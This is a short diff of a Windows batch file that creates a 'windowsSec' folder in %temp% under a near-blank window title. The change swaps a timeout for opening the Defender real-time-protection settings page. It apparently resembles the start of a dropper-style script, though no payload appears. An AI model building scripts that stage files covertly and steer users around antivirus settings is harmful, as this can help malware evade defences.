@@ -1,6 +1,7 @@
 @echo off
 title .
-timeout /t 2 >nul
+start windowsdefender://enablertp/
+pause
 cd %temp%
 md windowsSec
 cd windowsSec
